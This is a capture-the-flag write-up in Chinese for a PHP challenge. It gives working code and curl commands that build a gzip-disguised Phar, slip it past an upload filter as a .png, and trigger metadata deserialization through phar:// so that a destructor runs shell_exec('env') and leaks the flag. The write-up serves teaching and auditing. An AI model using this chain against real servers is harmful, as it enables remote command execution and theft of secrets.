# 文件查询器（蓝）

## 题目简述

题目由 `index.php` 和 `upload.php` 两部分组成：上传接口只允许 `jpg`、`png`、`pdf` 后缀，并拒绝内容中出现 `__HALT_COMPILER();`；查询接口将用户输入传给 `file_get_contents()`。`index.php` 还定义了 `MaHaYu` 类，其析构函数会把两个对象属性分别当作函数名和参数调用。

附件 Dockerfile 使用 PHP 7.4。在该版本中，以 `phar://` 调用文件系统函数会加载并反序列化 Phar 元数据。因此可以上传包含 `MaHaYu` 对象的压缩 Phar，借查询功能触发反序列化，再由析构函数执行 `shell_exec('env')` 读取环境变量中的 flag。

## 解题过程

### 构造反序列化调用链

`MaHaYu::__destruct()` 存在可控的动态函数调用：

```php
public function __destruct()
{
    $HG2 = $this->HG2;
    $FM2tM = $this->FM2tM;
    echo "Wow";
    var_dump($HG2($FM2tM));
}
```

只要令 `HG2` 为 `shell_exec`、`FM2tM` 为 `env`，析构时就会执行 `shell_exec('env')`。类中的函数名黑名单没有包含 `shell_exec`；而对象从序列化数据恢复时不会调用 `__construct()`，最终会在请求结束时调用 `__destruct()`。

生成 Phar 的脚本如下。攻击端只需声明同名、同可见性的属性，目标反序列化后会将其还原为目标进程中已经定义的 `MaHaYu` 对象：

```php
<?php
class MaHaYu
{
    public $HG2 = "shell_exec";
    public $ToT = "unused";
    public $FM2tM = "env";
}

@unlink("payload.phar");

$phar = new Phar("payload.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new MaHaYu());
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

关闭 `phar.readonly` 后生成归档：

```bash
php -d phar.readonly=0 make.php
```

### 绕过上传检查

上传接口的关键检查如下：

```php
$temp = explode(".", $_FILES["file"]["name"]);
$extension = end($temp);
$content = file_get_contents($_FILES["file"]["tmp_name"]);
$pos = strpos($content, "__HALT_COMPILER();");
```

直接上传普通 Phar 会因 stub 中存在目标字符串而失败。将整个 Phar 用 gzip 压缩后，磁盘上的原始字节不再包含这段明文；PHP 的 Phar 包装器仍能识别压缩归档。再将结果命名为允许的 `.png` 后缀即可同时通过两项检查：

```bash
gzip -c payload.phar > payload.png
curl -F "file=@payload.png;filename=payload.png" http://target/upload.php
```

服务端应返回：

```text
Success ./upload/payload.png
```

### 触发 Phar 元数据反序列化

查询接口虽然过滤了多种协议名和敏感单词，但没有过滤 `phar`：

```php
echo base64_encode(file_get_contents($file));
```

让 `file_get_contents()` 访问归档内已有的 `test.txt`，PHP 7.4 在解析 Phar 时便会反序列化元数据：

```bash
curl --data-urlencode "file=phar://./upload/payload.png/test.txt" \
  http://target/index.php
```

归档文件本身会返回 Base64 编码的 `test`，请求结束时 `MaHaYu::__destruct()` 还会输出 `shell_exec('env')` 的结果，其中包含：

```text
FLAG=0xGame{Y0u_Are_Rea11y_a_Ph4r_G0d!}
```

最终 flag：

```text
0xGame{Y0u_Are_Rea11y_a_Ph4r_G0d!}
```

## 方法总结

本题的主线是“文件上传 + Phar 元数据反序列化 + 析构函数动态调用”。后缀白名单不能识别文件真实类型，明文关键字检查又能被整体压缩绕过；查询接口则提供了触发 `phar://` 的文件系统函数。审计类似题目时，应同时关注 PHP 版本、所有文件操作函数、可控对象属性以及析构等魔术方法，不能只把注意力放在上传后缀上。
